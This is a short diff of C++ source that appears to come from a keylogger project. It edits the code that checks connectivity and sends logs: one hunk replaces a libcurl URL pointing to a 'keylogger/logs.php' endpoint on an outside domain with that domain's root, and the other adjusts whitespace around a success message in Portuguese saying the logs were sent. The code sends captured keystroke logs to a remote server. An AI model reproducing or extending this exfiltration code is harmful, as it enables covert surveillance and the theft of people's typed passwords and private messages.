@@ -143,7 +143,7 @@ bool IsInternetAvailable()
     if (curl)
     {
         std::string response;
-        curl_easy_setopt(curl, CURLOPT_URL, "https://cyberfran.com.br/keylogger/logs.php");
+        curl_easy_setopt(curl, CURLOPT_URL, "https://cyberfran.com.br/");
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
 
@@ -177,7 +177,7 @@ void SendLogs(const std::string &logs)
         CURLcode result = curl_easy_perform(curl);
 
         curl_easy_cleanup(curl);
-        
+
         if (result == CURLE_OK)
         {
             std::cout << "Logs enviados com sucesso." << std::endl;
